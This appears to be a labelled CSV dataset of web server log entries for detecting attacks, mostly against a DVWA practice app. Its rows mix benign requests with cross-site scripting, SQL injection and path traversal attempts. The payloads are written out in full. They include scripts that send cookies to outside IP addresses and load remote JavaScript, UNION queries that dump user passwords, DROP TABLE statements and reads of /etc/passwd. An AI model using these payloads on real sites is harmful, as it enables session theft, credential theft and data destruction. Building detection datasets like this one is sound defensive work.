Logs,Attack,
"GET /dvwa/vulnerabilities/exec/ HTTP/1.1"" [-] 200 1444",Benign,0
"GET / HTTP/1.1"" [-] 403 152",Benign,0
"GET /favicon.ico HTTP/1.1"" [-] 404 152",Benign,0
"GET /dvwa HTTP/1.1"" [-] 301 194",Benign,0
"GET /dvwa/ HTTP/1.1"" [-] 302 5",Benign,0
"GET /dvwa/login.php HTTP/1.1"" [-] 200 684",Benign,0
"GET /dvwa/dvwa/css/login.css HTTP/1.1"" [-] 200 842",Benign,0
"GET /dvwa/dvwa/images/login_logo.png HTTP/1.1"" [-] 200 9088",Benign,0
"GET /dvwa/setup.php HTTP/1.1"" [-] 200 2085",Benign,0
"GET /dvwa/dvwa/images/spanner.png HTTP/1.1"" [-] 200 464",Benign,0
"GET /dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 404 152",Benign,0
"GET /dvwa/security.php HTTP/1.1"" [-] 200 2202",Benign,0
"GET /dvwa/dvwa/images/lock.png HTTP/1.1"" [-] 200 761",Benign,0
"GET /dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 404 152",Benign,0
GET /?file=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F145.190.136.169%22%3C%2Fscript%3E HTTP/1.1  200 1297 ,XSS,1
GET /?file=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F183.250.61.150%22%3C%2Fscript%3E HTTP/1.1  200 3886 ,XSS,1
GET /?name=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F124.25.127.129%2F898879.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 4972 ,XSS,1
"GET /?name=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F141.19.75.249%2F869455.js%3D%3E%3C%2Fscript%3E HTTP/1.1"" 200 4879",XSS,1
GET /?name=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 3288 ,XSS,1
GET /?name=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 3982 ,XSS,1
GET /?name=%3Cscript%3E%window.open%28%27http%3A%2F%2F181.217.202.255%2F488204%27%293C%2Fscript%3E HTTP/1.1  200 1285 ,XSS,1
GET /?name=%3Cscript%3E%window.open%28%27http%3A%2F%2F4.8.29.8%2F894133%27%293C%2Fscript%3E HTTP/1.1  200 7337 ,XSS,1
GET /?name=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F136.108.230.32%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 2624 ,XSS,1
GET /?name=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F156.136.208.75%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 5807 ,XSS,1
GET /?name=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F0.156.130.88%22%3C%2Fscript%3E HTTP/1.1  200 4228 ,XSS,1
GET /?name=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F110.108.96.122%22%3C%2Fscript%3E HTTP/1.1  200 4935 ,XSS,1
GET /?p=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F111.115.213.48%2F804199.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 7000 ,XSS,1
GET /?p=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F164.235.246.70%2F796213.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 2687 ,XSS,1
GET /?p=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 4343 ,XSS,1
GET /?p=%3Cscript%3E%window.open%28%27http%3A%2F%2F172.68.135.129%2F47198%27%293C%2Fscript%3E HTTP/1.1  200 2330 ,XSS,1
GET /?p=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F153.131.117.236%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 1732 ,XSS,1
GET /?p=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F100.183.88.107%22%3C%2Fscript%3E HTTP/1.1  200 2158 ,XSS,1
GET /?search=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F107.238.201.227%2F763569.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 5551 ,XSS,1
GET /?search=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 1472 ,XSS,1
GET /?search=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 1604 ,XSS,1
GET /?search=%3Cscript%3E%window.open%28%27http%3A%2F%2F143.46.228.198%2F106135%27%293C%2Fscript%3E HTTP/1.1  200 7076 ,XSS,1
GET /?search=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F114.61.64.247%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 6421 ,XSS,1
GET /?search=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F12.66.35.241%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 6644 ,XSS,1
GET /?search=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F12.80.50.136%22%3C%2Fscript%3E HTTP/1.1  200 3879 ,XSS,1
GET /?search=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F152.4.200.33%22%3C%2Fscript%3E HTTP/1.1  200 6953 ,XSS,1
"GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E",XSS,1
"GET /dvwa/dvwa/css/main.css HTTP/1.1"" [-] 304 0",XSS,1
"GET /dvwa/dvwa/images/logo.png HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E",XSS,1
"GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%253Cimg%2520src%3Dx%2520onerror%3Dalert%281%29%253Ebob%253C%2Fimg%253E HTTP/1.1"" [-] 200 1593 ""http://192.168.154.128/dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=x%20onerror=alert(1)%3Ebob%3C/img%3E",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%253Cimg%2520src%3Dx%2520onerror%3Dalert%281%29%253Ebob%253C%2Fimg%253E HTTP/1.1"" [-] 200 1593 ""http://192.168.154.128/dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=x%20onerror=alert(1)%3Ebob%3C/img%3E",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%3Cbody%20onload=alert(1)%3E HTTP/1.1"" [-] 200 1593",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=%E2%80%99 HTTP/1.1"" [-] 200 1593",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=%E2%80%99 HTTP/1.1"" [-] 200 1593",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1"" [-] 200 1593",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=x%20onerror=alert(1)%3Ebob%3C/img%3E HTTP/1.1"" [-] 200 1593",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1"" [-] 200 1590",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1"" [-] 302 5",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%3Cxss%20onmouseover=%22alert(1)%22%3EEngkish%3C/xss%3E HTTP/1.1"" [-] 200 1593",XSS,1
"GET /dvwa/vulnerabilities/xss_d/?default=%3Cxss%20onmouseover=%22alert(1)%22%3EEngkish%3C/xss%3E HTTP/1.1"" [-] 200 1593",XSS,1
"GET /dvwa/vulnerabilities/xss_r/?name=%3Conclick%3Dalert%281%29%3Eclick+me HTTP/1.1"" [-] 200 1477 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E",XSS,1
"GET /dvwa/vulnerabilities/xss_r/?name=%3Conclick%3Dalert%281%29%3Eclick+me HTTP/1.1"" [-] 200 1480 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3C%3E",XSS,1
"GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E HTTP/1.1"" [-] 200 1470",XSS,1
"GET /dvwa/vulnerabilities/xss_r/?name=%3Cxss+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E HTTP/1.1"" [-] 200 1488 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Conclick%3Dalert%281%29%3Eclick+me",XSS,1
"GET /dvwa/vulnerabilities/xss_r/?name=script HTTP/1.1"" [-] 200 1465 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=%3Cxss+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E",XSS,1
"POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1"" [txtName=a&mtxMessage=onmouseover%3D%22alert%281%29%22&btnSign=Sign+Guestbook] 200 1763",XSS,1
"POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1"" [txtName=test&mtxMessage=%3Conmouseover%3D%22alert%281%29%22%3E&btnSign=Sign+Guestbook] 200 1774",XSS,1
"GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccomment%2Ccomment_id%2Cname%29%29%2C0x717a786b71%29%2CNULL%20FROM%20dvwa.guestbook--%20-&Submit=Submit HTTP/1.1"" [-] 200 82",SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ctable_name%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x64767761%29--%20-&Submit=Submit HTTP/1.1"" [-] 200 82",SQL Injection,3
GET /dvwa/vulnerabilities/sqli/?id=1%27+SELECT+*+FROM+users%23&Submit=Submit HTTP/1.1  500 295 ,SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+*+FROM+users%23&Submit=Submit HTTP/1.1  500 295 ""http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users%23&Submit=Submit",SQL Injection,3
GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users%23&Submit=Submit HTTP/1.1  200 1889,SQL Injection,3
GET login/?id=%27+or+1=1%23 HTTP/1.1  200 1568 ,SQL Injection,3
GET login/?id=%27+or+1=1%23 HTTP/1.1  200 1662 ,SQL Injection,3
GET login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit HTTP/1.1  200 1117 ,SQL Injection,3
GET login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit HTTP/1.1  200 1229 ,SQL Injection,3
GET login/?id=admin%27+-- HTTP/1.1  200 1048 ,SQL Injection,3
GET login/?id=admin%27+-- HTTP/1.1  200 1139 ,SQL Injection,3
GET login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit HTTP/1.1  200 1211 ,SQL Injection,3
GET login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit HTTP/1.1  200 1302 ,SQL Injection,3
GET /dvwa/vulnerabilities/sqli/?id=%22%20or%20%22%22%2A%22&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1674 ,SQL Injection,3
GET /dvwa/vulnerabilities/sqli/?id=%20WHERE%201%3D1%20AND%201%3D1%23&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1676 ,SQL Injection,3
GET /dvwa/vulnerabilities/sqli/?id=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1672 ,SQL Injection,3
GET /dvwa/vulnerabilities/sqli/?id=%27%20UNION%20SELECT%20sum%28columnname%20%29%20from%20tablename%20--&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1676 ,SQL Injection,3
GET /dvwa/vulnerabilities/sqli/?id=1%27%20GROUP%20BY%201%2C2%2C--%2B&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1676 ,SQL Injection,3
GET /dvwa/vulnerabilities/sqli/?id=1%27%20ORDER%20BY%202--%2B&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1674 ,SQL Injection,3
GET /dvwa/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1674 ,SQL Injection,3
GET /products.php?categoryid=1%20OR%201=1;-- HTTP/1.1  200 1432,SQL Injection,3
GET /search.php?search_query=%27;DROP%20TABLE%20users;-- HTTP/1.1  500 1432,SQL Injection,3
"GET /profile.php?id=1234%20UNION%20SELECT%20username,password%20FROM%20users;-- HTTP/1.1  200 1203",SQL Injection,3
GET /articles.php?id=1%20OR%20SLEEP(10);-- HTTP/1.1  200 1203,SQL Injection,3
GET /search.php?q=foo%27;DROP%20TABLE%20users;%20-- HTTP/1.1   200 1123,SQL Injection,3
"GET /search.php?q=foo%27%3B%20SELECT%20*%20FROM%20users%3B%20-- HTTP/1.1"" 200 1123",SQL Injection,3
"GET /usr/login HTTP/1.1"" 502 4950",Benign,0
"POST /usr/admin/developer HTTP/1.1"" 502 4955",Benign,0
"GET /usr/admin/developer HTTP/1.1"" 303 5005",Benign,0
"POST /usr/login HTTP/1.1"" 403 4995",Benign,0
"PUT /usr/register HTTP/1.1"" 200 4980",Benign,0
"GET /usr/register HTTP/1.1"" 404 4989",Benign,0
"GET /dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1"" 200 2451",Local File Inclusion,2
"GET /dvwa/vulnerabilities/fi/?page=../../hackable/flags/fi.php HTTP/1.1"" 200 1586",Local File Inclusion,2
"GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1657 ""http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd",Local File Inclusion,2
"GET /dvwa/vulnerabilities/view_source.php?id=fi&security=low HTTP/1.1"" 200 1024 ""http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../hackable/flags/",Local File Inclusion,2
